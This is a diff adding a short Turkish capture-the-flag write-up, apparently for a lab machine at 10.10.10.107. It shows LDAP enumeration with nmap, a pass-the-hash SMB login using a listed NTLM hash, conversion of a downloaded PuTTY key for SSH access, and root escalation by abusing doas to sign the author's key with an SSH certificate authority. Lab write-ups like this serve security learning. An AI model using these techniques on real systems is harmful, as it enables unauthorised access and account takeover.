@@ -1,0 +1,39 @@
+-----------------------------USER--------------------------------------------
+makine de ldap adlı bir port un açık olduğunu öğrendim ve araştırmaya koyuldum
+port hakkında bilgi topladıktan sonra içinde benim için samba hash ve kullanıcı 
+bulundurduğunu buldum şu komut ile : nmap -p 389 --script ldap-search 10.10.10.107
+
+sonrasında 2 kullanıcı buldum bob ve alice ama alice de hash bulunuyordu bu yüzden
+alice den devam ettim sonra biraz daha araştırınca login olmayı öğrendim 
+login olduğum komut şu :  
+
+python smbclient.py YPUFFY/alice1978@10.10.10.107 -hashes aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDCF6047784DE8B9FD8B
+
+sonra karşıma terminal geldi ve bazı komutlar kullanarak bir dosya aldım
+
+shares --> paylaşılanları gördüm
+use --> paylaşılanları seçmek için 
+get --> dosyayı indirmek için
+
+sonrasında içinde bir key indirdim, biraz daha araştırma ile bu keyin 
+putty key olduğunu öğrendim ve bunun ssh keye çevirileceğini öğrendim
+sonrasında doğru komutlarla çevirdim : puttygen my_private_key.ppk -O private-openssh -o id_rsa
+
+ve rsa key edindim bununla alice1978 hesabına ssh login olucağımı tahmin edebiliyordum
+terminale --> ssh alice1978@10.10.10.107 -i id_rsa yazdım ve login olup user i aldım.
+
+--------------------------ROOT-------------------------------------------
+
+Root için etraftan biraz bilgi toplayınca şu şekilde root aldım;
+
+ilk olarak kendi public keyimi (.ssh ' nin içinde ki id_rsa.pub)  karşı pc ye aktardım onu da karşı pc de 
+cat > id_rsa.pub yazdım ve public keyimi buraya yapıştırıp ctrl+c yaptım. Bu işlemden sonra 
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I $bk -n $bk /tmp/id_rsa.pub yazdım ve public keyimi imzaladım
+sonrasında imzalanmış public keyim oluştu "id_rsa-cert.pub" adlı bu imzalanmış public keyi kopyaladım ve
+kendi sistemimin .ssh dizinininde ki id_rsa.pub dosyasının içindekileri ile değiştirdim.
+
+Sonra id_rsa dosyasına tam yetki verdim (chmod 700 id_rsa) 
+
+terminalime --> ssh -i /root/.ssh/id_rsa root@10.10.10.107 yazdım ve root olarak login olup 
+root.txt aldım
+
